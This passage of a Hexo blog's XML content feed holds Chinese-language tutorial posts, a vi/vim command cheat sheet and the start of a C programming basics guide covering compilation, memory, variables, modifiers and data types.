rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vi</title>
      <link href="/2020/07/01/i/"/>
      <url>/2020/07/01/i/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>vi文本编辑</p></blockquote><a id="more"></a><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li>vim三种状态模式</li></ul><p><img src="/images/pasted-41.png" alt="vim状态模式" /></p><h1 id="命令总结"><a class="markdownIt-Anchor" href="#命令总结"></a> 命令总结</h1><h2 id="启动和退出"><a class="markdownIt-Anchor" href="#启动和退出"></a> 启动和退出</h2><table><thead><tr><th>启动和退出</th><th></th></tr></thead><tbody><tr><td>vi</td><td><code>vi filename</code>打开文件</td></tr><tr><td>:q</td><td>退出</td></tr></tbody></table><h2 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h2><table><thead><tr><th>文件操作</th><th></th></tr></thead><tbody><tr><td>:w</td><td>保存对 vi 编辑器中已打开文件的修改</td></tr><tr><td>:w myfile</td><td>将 vi 编辑器中的内容另存为指定文件名</td></tr><tr><td>:wq</td><td>对 vi 编辑器中的文件进行保存并退出 vi 编辑器</td></tr><tr><td>:q!</td><td>放弃对文件内容的修改，并退出 vi 编辑器</td></tr></tbody></table><h2 id="光标操作"><a class="markdownIt-Anchor" href="#光标操作"></a> 光标操作</h2><h3 id="光标移动"><a class="markdownIt-Anchor" href="#光标移动"></a> 光标移动</h3><table><thead><tr><th>光标移动</th><th></th></tr></thead><tbody><tr><td>h</td><td>向左移动光标</td></tr><tr><td>l</td><td>向右移动光标</td></tr><tr><td>k</td><td>向上移动光标</td></tr><tr><td>j</td><td>向下移动光标</td></tr></tbody></table><h3 id="翻页"><a class="markdownIt-Anchor" href="#翻页"></a> 翻页</h3><table><thead><tr><th>翻页</th><th></th></tr></thead><tbody><tr><td>Ctrl + f</td><td>向下翻整页</td></tr><tr><td>Ctrl + b</td><td>向上翻整页</td></tr><tr><td>Ctrl + u</td><td>向上翻半页</td></tr><tr><td>Ctrl + d</td><td>向下翻半页</td></tr></tbody></table><h3 id="行内移动光标"><a class="markdownIt-Anchor" href="#行内移动光标"></a> 行内移动光标</h3><table><thead><tr><th>行内移动光标</th><th></th></tr></thead><tbody><tr><td>^</td><td>将光标快速跳转到本行的行首字符</td></tr><tr><td>$</td><td>将光标快速跳转到本行的行尾字符</td></tr></tbody></table><h3 id="文件内跳转"><a class="markdownIt-Anchor" href="#文件内跳转"></a> 文件内跳转</h3><table><thead><tr><th>文件内跳转</th><th></th></tr></thead><tbody><tr><td>:set nu</td><td>在编辑器中显示行号</td></tr><tr><td>:set nonu</td><td>取消编辑器中的行号显示</td></tr><tr><td>1G(gg)</td><td>跳转到文件的首行</td></tr><tr><td>G</td><td>跳转到文件的末尾行</td></tr><tr><td>#G</td><td>跳转到文件中的第#行</td></tr></tbody></table><h2 id="编辑操作"><a class="markdownIt-Anchor" href="#编辑操作"></a> 编辑操作</h2><h3 id="进入输入模式"><a class="markdownIt-Anchor" href="#进入输入模式"></a> 进入输入模式</h3><table><thead><tr><th>进入输入模式</th><th></th></tr></thead><tbody><tr><td>i</td><td>在当前光标处进入插入状态</td></tr><tr><td>a</td><td>在当前光标后进入插入状态</td></tr><tr><td>o</td><td>在当前行的下面插入新行，光标移动到新行的行首，进入插入状态</td></tr><tr><td>O</td><td>在当前行的上面插入新行，光标移动到新行的行首，进入插入状态</td></tr><tr><td>c(n)w</td><td>删除当前光标到所在单词尾部的字符，并进入插入状态</td></tr><tr><td>c$</td><td>删除当前光标到行尾的字符，并进入插入状态</td></tr><tr><td>c^</td><td>命令删除当前光标之前（不包括光标上的字符）到行首的字符，并进入插入状态</td></tr></tbody></table><h3 id="删除操作"><a class="markdownIt-Anchor" href="#删除操作"></a> 删除操作</h3><table><thead><tr><th>删除操作</th><th></th></tr></thead><tbody><tr><td>x</td><td>删除光标处的单个字符</td></tr><tr><td>(n)dd</td><td>删除光标所 n 行</td></tr><tr><td>:3,5 d</td><td>删除从第 3 行到第 5 行的内容</td></tr><tr><td>dw</td><td>删除当前字符到单词尾（包括空格）的所有字符</td></tr><tr><td>de</td><td>删除当前字符到单词尾（不包括单词尾部的空格）的所有字符</td></tr><tr><td>d$</td><td>删除当前字符到行尾的所有字符</td></tr><tr><td>d^</td><td>删除当前字符到行首的所有字符</td></tr><tr><td>J(大写)</td><td>删除光标所在行行尾的换行符，相当于合并当前行和下一行的内容</td></tr></tbody></table><h3 id="拷贝和粘贴"><a class="markdownIt-Anchor" href="#拷贝和粘贴"></a> 拷贝和粘贴</h3><table><thead><tr><th>拷贝和粘贴</th><th></th></tr></thead><tbody><tr><td>(n)yy</td><td>复制当前行整行的内容到 vi 缓冲区</td></tr><tr><td>:3,6 co(m) 12</td><td>复制(剪切)3-6 行，到第 12 行处</td></tr><tr><td>p</td><td>读取 vi 缓冲区中的内容，并粘贴到光标当前的位置（不覆盖文件已有的内容）</td></tr></tbody></table><h3 id="撤销与恢复"><a class="markdownIt-Anchor" href="#撤销与恢复"></a> 撤销与恢复</h3><table><thead><tr><th>撤销与恢复</th><th></th></tr></thead><tbody><tr><td>u</td><td>取消最近一次的操作，并恢复操作结果可以多次使用 u 命令恢复已进行的多步操作</td></tr><tr><td>U</td><td>取消对当前整行进行的所有操作</td></tr><tr><td>Ctrl + r</td><td>对使用 u 命令撤销的操作进行恢复</td></tr></tbody></table><h2 id="查找与替换操作"><a class="markdownIt-Anchor" href="#查找与替换操作"></a> 查找与替换操作</h2><h3 id="查找"><a class="markdownIt-Anchor" href="#查找"></a> 查找</h3><table><thead><tr><th>查找</th><th></th></tr></thead><tbody><tr><td>/word</td><td>从上而下在文件中查找字符串“word”</td></tr><tr><td>?word</td><td>从下而上在文件中查找字符串“word” n 定位下一个匹配的被查找字符串</td></tr><tr><td>N</td><td>定位上一个匹配的被查找字符串</td></tr></tbody></table><h3 id="替换"><a class="markdownIt-Anchor" href="#替换"></a> 替换</h3><table><thead><tr><th>替换</th><th></th></tr></thead><tbody><tr><td><code>:s/old/new</code></td><td>将当前行中查找到的第一个字符“old” 串替换为“new”</td></tr><tr><td><code>:s/old/new/g</code></td><td>将当前行中查找到的所有字符串“old” 替换为“new”</td></tr><tr><td><code>:#,#s/old/new/g</code></td><td>在行号“#,#”范围内替换所有的字串“old”为 “new”</td></tr><tr><td><code>:%s/old/new/g</code></td><td>在整个文件范围内替换所有的字串“old”为 “new</td></tr></tbody></table><h1 id="最简易配置"><a class="markdownIt-Anchor" href="#最简易配置"></a> 最简易配置</h1><ul><li>输入 vim ~/.vimrc(本用户)或 vim /etc/[vim/]vimrc(全局用户)，该文件是一个隐藏文件，如果没有则创建它，该文件中保存一些，vim 的常用配置。</li></ul><table><thead><tr><th>命令</th><th>语义</th><th>缩写</th></tr></thead><tbody><tr><td>set number</td><td>代码显示行号</td><td>set nu</td></tr><tr><td>set nonumber</td><td></td><td>set nonu</td></tr><tr><td>syntax on</td><td>关键词高亮显示</td><td></td></tr><tr><td>set cindent</td><td>c 语法自动缩进</td><td>set ci</td></tr><tr><td>set autoindent</td><td>新行自动缩进</td><td>set ai</td></tr><tr><td>set shiftwidth=4</td><td>缩进宽度 4</td><td>set sw=4</td></tr><tr><td>set tabstop=4</td><td>tab 键宽度 4</td><td>set ts=4</td></tr><tr><td>set softtabstop=4</td><td>制表符宽度4</td><td>set st=4</td></tr><tr><td>set nobackup</td><td>不备份</td><td>set nb</td></tr></tbody></table><h1 id="学习工具-vimtutor"><a class="markdownIt-Anchor" href="#学习工具-vimtutor"></a> 学习工具 vimtutor</h1><ul><li>在命令行中输入 vimtutor 默认是英文版的，可以使用中文版 vimtutor -g zh。</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言</title>
      <link href="/2020/07/01/c%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/07/01/c%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>c语言基础</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><h2 id="hello-world"><a class="markdownIt-Anchor" href="#hello-world"></a> hello world</h2><ul><li>C语言的作者：<code>Dennis Ritchie</code>(丹尼斯·里奇)在《C程序设计语言》中，第一次引入了打印<code>hello world</code>的案例，后面的其他语言争相效仿，以示敬意。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ide"><a class="markdownIt-Anchor" href="#ide"></a> IDE</h2><ul><li>对于集成开发环境（IDE，Integrated Development Environment ）而言，减少了环境配置，合并了流程，使其便于快速开发。c语言的编译器常用的vc++和qt。</li></ul><h3 id="qt"><a class="markdownIt-Anchor" href="#qt"></a> Qt</h3><ul><li>qt的发音为cute。</li></ul><h4 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h4><table><thead><tr><th>qt安装</th><th></th></tr></thead><tbody><tr><td>下载</td><td><a href="http://download.qt.io/archive/qt/">下载地址</a>选择最新版<code>qt-opensource-windows-x86-5.14.2.exe</code></td></tr><tr><td>勾选组件</td><td>建议全部勾选</td></tr><tr><td>环境变量</td><td>设置qt的目录<code>...\qt\5.10.1\mingw53_32\bin</code>和<code>...\qt\Tools\mingw530_32\bin</code></td></tr></tbody></table><h4 id="快捷键"><a class="markdownIt-Anchor" href="#快捷键"></a> 快捷键</h4><table><thead><tr><th>快捷键</th><th></th></tr></thead><tbody><tr><td><code>ctrl+?</code></td><td>注释选择的代码</td></tr><tr><td><code>ctrl+i</code></td><td>格式化选择的代码</td></tr><tr><td><code>ctrl+b</code></td><td>build，编译程序</td></tr><tr><td><code>ctrl+r</code></td><td>run，直接编译并运行程序</td></tr></tbody></table><h3 id="vcvisual-stdio"><a class="markdownIt-Anchor" href="#vcvisual-stdio"></a> vc++/visual stdio</h3><h3 id="vscode"><a class="markdownIt-Anchor" href="#vscode"></a> vscode</h3><h2 id="从源程序到可执行程序"><a class="markdownIt-Anchor" href="#从源程序到可执行程序"></a> 从源程序到可执行程序</h2><ul><li>源程序就是一个.txt 的普通文本文件，是经历了哪些过程，变为可执行性文件的呢？大体上分为四个步骤： 预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接 四个过程。</li></ul><p><img src="/images/pasted-40.png" alt="源程序到可执行文件的过程" /></p><ul><li>预处理：预处理相当于根据预处理命令组装成新的 C 程序，不过常以 i 为扩展名；把头文件声明的变量进行了汇总成一个文件，消除了注释(gcc -E main.c -o main.i)；</li><li>编译：转为汇编语言；将得到的 i 文件翻译成汇编代码 .s 文件(gcc -S main.i -o main.s)；</li><li>汇编：将汇编文件翻译成机器指令，并打包成可重定位目标程序的 O 文件。该文件是二进制文件，字节编码是机器指令(gcc -c main.s -o main.o)；</li><li>链接：将二进制文件中用到的库进行链接，将引用的其他 O 文件并入到我们程序所在的 o 文件中，处理得到最终的可执行文件(gcc main.o -o hello)；</li></ul><h1 id="常用语法"><a class="markdownIt-Anchor" href="#常用语法"></a> 常用语法</h1><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><table><thead><tr><th>注释</th><th></th></tr></thead><tbody><tr><td>单行注释</td><td><code>//</code></td></tr><tr><td>多行注释</td><td><code>/**/</code></td></tr><tr><td>条件编译</td><td>使用条件编译的方式实现多行注释 <code>#if 0 ... #endif</code></td></tr></tbody></table><h2 id="内存模型"><a class="markdownIt-Anchor" href="#内存模型"></a> 内存模型</h2><ul><li>物理基础<ul><li>对于 32 机而言，内存模型线性的，这是硬件基础。左边表示十六进制的访问地址，右边分别表示<font color="red">寻址的最小单位</font>Byte和<font color="red">内存的最小单位 </font>bit，1Byte = 8bit。32位机最大的寻址空间是4GB，64位机是16EB。</li></ul></li></ul><table><thead><tr><th>内存大小单位</th></tr></thead><tbody><tr><td>1 B = 8 b</td></tr><tr><td>1 KB = 1024 B</td></tr><tr><td>1 MB = 1024 KB</td></tr><tr><td>1 GB = 1024 MB</td></tr><tr><td>1 TB = 1024 GB</td></tr><tr><td>1 PB = 1024 TB</td></tr><tr><td>1 EB = 1024 PB</td></tr></tbody></table><h3 id="进程空间"><a class="markdownIt-Anchor" href="#进程空间"></a> 进程空间</h3><ul><li>程序，是经源码编译后的可执行文件，可执行文件可以多次被执行，比如我们可以多次打开 office。</li><li>进程，是程序加载到内存后开始执行，至执行结束，这样一段时间概念，多次打开的 wps,每打开一次都是一个进程，当我们每关闭一个 office，则表示该进程结束。</li><li>程序是静态概念，而进程动态/时间概念</li></ul><h3 id="栈内存"><a class="markdownIt-Anchor" href="#栈内存"></a> 栈内存</h3><ul><li>栈中存放任意类型的变量，但必须是<code>auto</code>类型修饰的，即自动类型的局部变量，随用随开，用完即消。内存的分配和销毁系统自动完成，不需要人工干预。</li><li>栈的大小并不大，他的意义并不在于存储大数据，而在于数据交换。查看栈的大小：<code>ulimit -a</code></li></ul><h3 id="堆内存"><a class="markdownIt-Anchor" href="#堆内存"></a> 堆内存</h3><ul><li>堆内存可以存放任意类型的数据，但需要自己申请与释放。</li><li>堆大小，想像中的无穷大，对于栈来说，大空间申请，唯此，无它耳。但实际使用中，受限于实际内存的大小和内存是否连续性</li></ul><h4 id="堆内存的申请与释放"><a class="markdownIt-Anchor" href="#堆内存的申请与释放"></a> 堆内存的申请与释放</h4><ul><li>申请和初始化的最小单位是字节(char类型：00-FF)</li></ul><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td><code>void * malloc(size_t _Size);</code></td><td>stdlib.h</td><td>申请堆内存空间并返回,所申请的空间并未初始化。常见的初始化方法是<code>memset</code>字节初始化。失败返回空指针NULL。</td></tr><tr><td><code>void memset()</code></td><td>stdlib.h</td><td>字节单位初始化</td></tr><tr><td><code>void *calloc(size_t nmemb, size_t size);</code></td><td>stdlib.h</td><td>申请堆内存空间并返回，所申请的空间，自动清零。</td></tr><tr><td><code>void *realloc(void *ptr, size_t size);</code></td><td>stdlib.h</td><td>扩容(缩小)原有内存的大小。通常用于扩容，缩小会会导致内存缩去的部分数据丢失。</td></tr><tr><td><code>void free(void *p);</code></td><td>stdlib.h</td><td>释放申请的堆内存</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int * p &#x3D; (int*)malloc(1024*1024*1024); &#x2F;&#x2F;申请堆空间。1G完全无压力</span><br><span class="line">if(p&#x3D;&#x3D;NULL)</span><br><span class="line">  printf(&quot;malloc error\n&quot;);&#x2F;&#x2F;申请堆内存错误</span><br><span class="line">memset(p,0,1024*1024*1024*sizeof(int));&#x2F;&#x2F;初始化0</span><br><span class="line">memset(p,1,1024*1024*1024*sizeof(int));&#x2F;&#x2F;初始化为：0101 0101</span><br><span class="line">free(p); &#x2F;&#x2F;手动释放</span><br><span class="line">p &#x3D; NULL; &#x2F;&#x2F;置空</span><br></pre></td></tr></table></figure><h4 id="堆与栈空间的返回"><a class="markdownIt-Anchor" href="#堆与栈空间的返回"></a> 堆与栈空间的返回</h4><ul><li>对于调用的函数，返回的要求：<ol><li>数值是可以返回的</li><li>地址也是可以返回</li><li>栈上的空间不可以返回, 原因,随用随开,用完即消</li><li>堆上的空间,是可以返回的</li></ol></li></ul><h1 id="常量与变量"><a class="markdownIt-Anchor" href="#常量与变量"></a> 常量与变量</h1><h2 id="常量"><a class="markdownIt-Anchor" href="#常量"></a> 常量</h2><ul><li>常量(Constant)量是程序中不可改变的量，常以字面量(Literal)，或者宏(Macro)的方式出现。 主要用于赋值或是参与计算,并且常量也是用类型的。</li></ul><h3 id="常量的类型"><a class="markdownIt-Anchor" href="#常量的类型"></a> 常量的类型</h3><ul><li><p><strong>整型常量</strong>的三种表形式</p><ol><li>十进制表示：除表示整数 0 外，不以 0 开头（以 0 开头的数字串会被解释成八进制数）。负数在前面加负号’ - ‘，后缀’ l ‘或’ L ‘表示长整型，’ u ‘或’ U '表示无符号数。例：345 31684 0 -23456 459L 356l 56789u 567LU</li><li>八进制表示：以数字 0 开头的一个连续数字序列，序列中只能有 0-7 这八个数字。例：045 -076 06745l 0177777u</li><li>十六进制表示：以 0X 或 0x 开头的连续数字和字母序列，序列中只能有 0-9、A-F 和 a-f 这些数字和字母，字母 a、b、c、d、e、f 分别对应数字 10、11、12、13、14、15，大小写均可。例：0x10 0X255 0xd4ef 0X6a7bL</li></ol></li><li><p><strong>实型常量</strong>有两种表示形式：</p><ol><li>小数形式：由数字和小数点组成，必须有小数点。例：4.23、0.15、.56、78.、0.0</li><li>指数形式：以幂的形式表示，以字母 e 或 E 后跟一个以 10 为底的幂数。</li></ol><ul><li>字母 e 或 E 之前后必须要有数字。</li><li>字母 e 或 E 后面的指数必须为整数，字母 e 或 E 的前后及数字之间不得有空格。</li><li>默认是 double 型，后缀为“f”或“F”即表示该数为 float 型，后缀“l”或“L”表示 long double 型。例：.5E3 4.5e0 34.2f .5F 12.56L 2.5E3L</li></ul></li><li><p><strong>字符常量</strong>的表现形式比较简单。以单引号引起来的一个字符。例：‘a’ ‘b’ ‘c’</p></li><li><p><strong>字符串常量</strong>的表现形式比较简单。以双引号引起来的一串字符。例：“a” &quot;abcdefg</p></li></ul><h2 id="变量"><a class="markdownIt-Anchor" href="#变量"></a> 变量</h2><ul><li>当我们用计算机语言来描述世界的时候，比如一个人的性别，身高，体重，收入，就需要变量来存储，变量之间不仅需要名字来识别，还需要类型来进行限定。</li></ul><h3 id="关键字"><a class="markdownIt-Anchor" href="#关键字"></a> 关键字</h3><ul><li>C语言的32个保留关键字</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="keyword">short</span> <span class="keyword">int</span> <span class="keyword">long</span> <span class="keyword">float</span> <span class="keyword">double</span> <span class="keyword">if</span> <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">do</span> <span class="keyword">while</span> <span class="keyword">for</span> <span class="keyword">switch</span> <span class="keyword">case</span> <span class="keyword">break</span> <span class="keyword">continue</span> <span class="keyword">default</span> <span class="keyword">goto</span> <span class="keyword">sizeof</span> <span class="keyword">auto</span> <span class="keyword">register</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">signed</span> <span class="keyword">typedef</span> struct <span class="keyword">enum</span> <span class="keyword">union</span> <span class="keyword">void</span> <span class="keyword">const</span> <span class="keyword">volatile</span></span><br></pre></td></tr></table></figure><h3 id="变量的命名规则"><a class="markdownIt-Anchor" href="#变量的命名规则"></a> 变量的命名规则</h3><ul><li>驼峰命名法</li></ul><h3 id="变量作用域-生命周期-修饰符"><a class="markdownIt-Anchor" href="#变量作用域-生命周期-修饰符"></a> 变量作用域、生命周期、修饰符</h3><h4 id="作用域"><a class="markdownIt-Anchor" href="#作用域"></a> 作用域</h4><ul><li>某事物起作用或有效的区域，称之为作用域。{}是作用域的限定符。{}以内的区域称为局部作用域，{}以外的称为全局作用域。<ul><li>局部变量：作用域起始于定义处，结束在右大括号。</li><li>全局变量/函数：全局量，在多文件编程中，可以通 extern 声明的方式，将作用域扩展到其它文件中去。</li></ul></li><li>同一作用域内不能有重名标识符。</li><li>若未赋值 ，系统将其初始化为，零。</li><li>全局命名污染，全局变量是指同一工程内的所有c文件中的全局变量，在全局作用域内，如果有重名则会造成重定义。</li></ul><h4 id="生命周期"><a class="markdownIt-Anchor" href="#生命周期"></a> 生命周期</h4><ul><li>局部变量：局部变量的生命周期，同其所在的函数。局部变量随着函数的执行而有生命，随着函数的执行结束而生命截止。</li><li>全局变量：全局变量的生命周期同进程，或是 main()函数或进程。</li></ul><h4 id="修饰符"><a class="markdownIt-Anchor" href="#修饰符"></a> 修饰符</h4><ul><li>修饰符格式：<code>auto int a;</code></li></ul><h5 id="auto"><a class="markdownIt-Anchor" href="#auto"></a> auto</h5><ul><li>auto修饰的变量存储于栈上。它修饰的变量的特点是，随用随开，用完即消。</li><li>只能修饰局部变量，可以省略，局部变量若无其它的修饰，则默认为 auto。</li></ul><h5 id="register"><a class="markdownIt-Anchor" href="#register"></a> register</h5><ul><li>只能修饰局部变量，</li><li>原则上，将内存中的变量升级到 CPU 寄存器中存储，这样访问速度会更快。但由于 CPU 寄存器数量相当有限，通常会在程序优化阶段，被优化为普通的 auto 类型变量。可以通过汇编代码来查看，优化过程(具体优化，与平台和编译相关)。</li></ul><h5 id="extern"><a class="markdownIt-Anchor" href="#extern"></a> extern</h5><ul><li>只能用来修饰全局变量，全局变量本身是全局可用的，但是由于文件是单个完成编译，并且编译是自上而下的，所以说，对于不是在本范围内定义的全局变量，要想使用必须用 extern 进行声明，如果不加上 extern ,就会造成重定义。</li><li>C 语言，是单文件编译的，然后再将编译的.o 文件同库一起链接成可执行文件。正是因为这一点，跨文件使用全局变量，需要声明。</li><li>注意，经 extern 声明的变量，不可以再初始化。</li></ul><h5 id="static"><a class="markdownIt-Anchor" href="#static"></a> static</h5><ul><li>局部变量<ul><li>static 修饰局部变量，修改了局部变量的生命周期。使其生命周期同进程或是 main()函数。</li><li>static 变量若未初始化，则系统初始化为零，并且只进行一次初始化。</li></ul></li><li>全局变量<ul><li>static 修饰全局变量，限制了他的外延性。使其成为仅在本文件内部使用的全局变量。</li><li>我们在前面讲过，全局变量会带来全局空间的命名污染。 这样既保留了全局变量的使用便利性，又不会造成全局空间的命名污染。</li></ul></li><li>函数<ul><li>函数本身就是全局可调用的，在编译时，只需要声明，即可完成编译，在链接的时候才去链接实现体。</li><li>static 修饰函数的意义，就在于将全局函数变成了，本文件内的全局函数。</li></ul></li></ul><h5 id="volatile"><a class="markdownIt-Anchor" href="#volatile"></a> volatile</h5><ul><li>volatile设计用来修饰被不同线程访问和修改的变量；volatile的作用是作为指令关键字，确保本条指令不会因编译器的优化而省略，且要求每次直接读值。</li><li>volatile的变量是说这变量可能会被意想不到地改变，这样，编译器就不会去假设这个变量的值了。优化器在用到这个变量时必须每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">square</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *ptr)</span></span>&#123; </span><br><span class="line">  <span class="keyword">return</span> ((*ptr) * (*ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用volatile变量的例子</p><ul><li>并行设备的硬件寄存器（如：状态寄存器）</li><li>一个中断服务子程序中会访问到的非自动变量（Non-automatic variables)</li><li>多线程应用中被几个任务共享的变量</li></ul></li><li><p>这是区分C程序员和嵌入式系统程序员的最基本的问题：嵌入式系统程序员经常同硬件、中断、RTOS等等打交道，所有这些都要求使用volatile变量。不懂得volatile内容将会带来灾难。</p></li><li><p>注意点：</p><ul><li><strong>一个参数既可以是const还可以是volatile</strong>：一个例子是只读的状态寄存器。它是volatile因为它可能被意想不到地改变。它是const因为程序不应该试图去修改它。</li><li><strong>一个指针可以是volatile</strong>：一个例子是当一个中断服务子程序修改一个指向一个buffer的指针时。</li></ul></li></ul><h1 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h1><h2 id="类型总览"><a class="markdownIt-Anchor" href="#类型总览"></a> 类型总览</h2><p><img src="/images/pasted-42.png" alt="类型总览" /></p><h2 id="基本类型"><a class="markdownIt-Anchor" href="#基本类型"></a> 基本类型</h2><h3 id="整型"><a class="markdownIt-Anchor" href="#整型"></a> 整型</h3><table><thead><tr><th>类型</th><th>位数(32 位机)</th><th>符号</th><th>范围</th><th>科学计数</th></tr></thead><tbody><tr><td>char</td><td>8</td><td>unsigned</td><td>0-255</td><td>0-2<sup>8</sup>-1</td></tr><tr><td>char</td><td>8</td><td>[signed]</td><td>-128-+127</td><td>-2<sup>7</sup>-+2<sup>7</sup>-1</td></tr><tr><td>short</td><td>16</td><td>unsigned</td><td>0-65535</td><td>0-2<sup>16</sup>-1</td></tr><tr><td>short</td><td>16</td><td>[signed]</td><td>-32768-+32767</td><td>-2<sup>15</sup>-+2<sup>15</sup>-1</td></tr><tr><td>int</td><td>32</td><td>unsigned</td><td></td><td>0-2<sup>32</sup>-1</td></tr><tr><td>int</td><td>32</td><td>[signed]</td><td></td><td>-2<sup>31</sup>-+2<sup>31</sup>-1</td></tr><tr><td>long</td><td>32</td><td>unsigned</td><td></td><td>0-2<sup>32</sup>-1</td></tr><tr><td>long</td><td>32</td><td>[signed]</td><td></td><td>-2<sup>31</sup>-+2<sup>31</sup>-1</td></tr><tr><td>long long</td><td>64</td><td>unsigned</td><td></td><td>0-2<sup>64</sup>-1</td></tr><tr><td>long long</td><td>64</td><td>[signed]</td><td></td><td>-2<sup>63</sup>-+2<sup>63</sup>-1</td></tr></tbody></table><h3 id="浮点型"><a class="markdownIt-Anchor" href="#浮点型"></a> 浮点型</h3><ul><li>一个浮点数（Floating Point Number）由三个基本成分构成：符号（Sign）、阶码（Exponent）和尾数（Mantissa）。通常，可以用下面的格式来表示浮点数：</li></ul><p><img src="/images/pasted-43.png" alt="浮点数结构" /></p><table><thead><tr><th>类型</th><th>位数(32 位机)</th><th>范围简算</th><th>精算</th><th>有效位数</th></tr></thead><tbody><tr><td>float</td><td>32</td><td>[2<sup>-128</sup>,2<sup>127</sup>]</td><td>[10<sup>-38</sup>,10 <sup>38</sup>]</td><td>6-7</td></tr><tr><td>float</td><td>32</td><td>[-2<sup>127</sup>, -2<sup>-128</sup>]</td><td>[-10<sup>38</sup>,-10<sup>-38</sup>]</td><td>6-7</td></tr><tr><td>double</td><td>64</td><td>[2<sup>-2048</sup>,2<sup>2047</sup>]</td><td>[10<sup>-308</sup>,10<sup>308</sup>]</td><td>15-16</td></tr><tr><td>double</td><td>64</td><td>[-2<sup>2047</sup>, -2<sup>-2048</sup>]</td><td>[-10<sup>308</sup>,-10<sup>-308</sup>]</td><td>15-16</td></tr><tr><td>long double</td><td></td><td></td><td></td><td></td></tr><tr><td>long double</td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="字符类型"><a class="markdownIt-Anchor" href="#字符类型"></a> 字符类型</h3><ul><li>计算机是不能存储字符的，只能在显示的时候进行转化。这种转化需要一张表，表里记载了转换规则，这张表，就是<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">ASCII编码表</a>。该表的本质就是一种对应关系。</li></ul><h4 id="转义字符"><a class="markdownIt-Anchor" href="#转义字符"></a> 转义字符</h4><ul><li>一些字符已经被语言征用代表了一些特定用途了，就可以用转义进行控制。</li></ul><table><thead><tr><th>字符</th><th>意义</th><th>ASCII 值</th><th>备注</th></tr></thead><tbody><tr><td>\b</td><td>退格(BS)当前位置向后回退一个字符</td><td>8</td><td>转义后，值发生了改变，通常在 0-32 以内表示控制字符。</td></tr><tr><td>\r</td><td>回车(CR),将当前位置移至本行开头</td><td>13</td><td></td></tr><tr><td>\n</td><td>换行(LF),将当前位置移至下一行开头</td><td>10</td><td></td></tr><tr><td>\t</td><td>水平制表(HT),跳到下一个 TAB 位置</td><td>9</td><td></td></tr><tr><td>\0</td><td>用于表示字符串的结束标记</td><td>0</td><td>用作字符串结束标志</td></tr><tr><td>\</td><td>代表一个反斜线字符 \</td><td>92</td><td>转义后，值并没有发生改变，解决了因被占用，又要作输出时引起的错误。</td></tr><tr><td>&quot;</td><td>代表一个双引号字符&quot;</td><td>34</td><td></td></tr><tr><td>’</td><td>代表一个单引号字符’</td><td>39</td><td></td></tr><tr><td>%%</td><td>代表一个百分号%</td><td>37</td><td></td></tr><tr><td>\ddd</td><td>1 到 3 位八进制所代表的任意字符</td><td>八进制数制</td><td>可表示任意的字符。注意跟后续字符沾连的问题。</td></tr><tr><td>\xhh</td><td>1 到 2 位十六进制所代表的任意字符</td><td>十六进制数值</td><td><code>\EA6number</code></td></tr></tbody></table><h4 id="字符格式化"><a class="markdownIt-Anchor" href="#字符格式化"></a> 字符格式化</h4><h5 id="格式控制"><a class="markdownIt-Anchor" href="#格式控制"></a> 格式控制</h5><ul><li><code>% 